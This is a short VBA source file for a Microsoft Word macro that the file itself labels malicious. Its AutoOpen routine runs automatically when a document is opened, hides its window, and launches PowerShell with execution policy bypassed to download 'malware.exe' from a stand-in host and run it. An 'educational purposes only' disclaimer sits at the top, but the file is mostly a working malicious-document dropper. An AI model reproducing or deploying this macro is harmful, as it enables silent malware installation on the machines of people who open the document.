' malicious_macro.bas
' Example of executing PowerShell commands using Word Macros
' WARNING: This code is for educational purposes only. Malicious use is illegal!

Sub AutoOpen()
    ' Automatically executes when the document is opened
    Dim cmd As String
    ' Construct the PowerShell command
    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'http://example.com/malware.exe' -OutFile 'payload.exe'; Start-Process 'payload.exe'"""
    ' Execute the PowerShell command
    Shell cmd, vbHide
End Sub
